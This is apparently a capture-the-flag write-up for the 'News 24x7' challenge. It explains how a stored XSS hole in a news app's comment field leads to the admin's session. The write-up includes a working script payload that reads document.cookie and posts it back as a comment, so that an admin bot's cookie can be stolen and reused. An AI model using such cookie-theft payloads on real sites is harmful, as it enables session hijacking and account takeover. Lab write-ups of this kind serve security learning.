# News 24x7

Total Solves - 40

Final Points - 218

## Description
Visit my opinionated news app today!

## Writeup
On opening the app and logging in you will notice a simple application. There are news articles and functionality to commend on news articles.

One can test that the comments were vulnerable to XSS.

Another thing to note is the `/robots.txt`

```
User-agent: *
Disallow: /secret
```
If you try to access `/secret`, it says " You need to be admin to view this."

Now there is scrolling text on the website that says an admin visits the page every minute to remove abusive comments.

Here one should realise that the XSS in comments can be used to steal admin's cookie which can then be used to access `/secret`.

Following script can be entered as input in comments

```html
<script>
var data = new FormData();

data.append('comment', document.cookie);

fetch('/article/1', {
    method: 'POST',
    mode: 'no-cors',
    body: data
})
</script>
```
After sometime, you will see a comment by admin containing his cookie. Use it to access `/secret` and you will see the flag.

## Flag
`CodefestCTF{st0r3d_X55_ftw_[a-zA-Z0-9]{9}}`
